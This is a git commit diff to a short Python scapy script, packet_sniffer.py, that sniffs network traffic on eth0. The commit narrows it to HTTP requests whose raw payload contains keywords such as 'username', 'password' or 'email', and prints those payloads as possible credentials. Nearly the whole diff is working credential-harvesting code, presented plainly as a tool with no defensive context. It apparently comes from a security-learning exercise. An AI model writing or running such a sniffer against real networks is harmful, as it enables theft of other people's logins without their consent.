76a2e03344b71e58395a09862b3eb43c913f47cb
JinethBosilu <157296244+JinethBosilu@users.noreply.github.com>
2026-02-11 16:58:26 +0530

    enhance packet sniffing functionality to filter HTTP requests and extract potential credentials

--- packet_sniffer.py
+++ packet_sniffer.py
@@ -1,10 +1,18 @@
 import scapy.all as scapy
+from scapy.layers import http
 
 def sniff(interface):
-    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
+    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="ip")
 
 def process_sniffed_packet(packet):
-    if packet.haslayer(scapy.IP):
-        print(packet[scapy.IP].src + " -> " + packet[scapy.IP].dst)
+    if packet.haslayer(http.HTTPRequest):
+        if packet.haslayer(scapy.Raw):
+             load = packet[scapy.Raw].load
+             keywords = ["username", "user", "login", "password", "pass", "email"]
+             for keyword in keywords:
+                 if keyword in str(load).lower():
+                     print("[+] Possible username/password found: " + load)
+                     break
+        #print(packet.show())
 
 sniff("eth0")
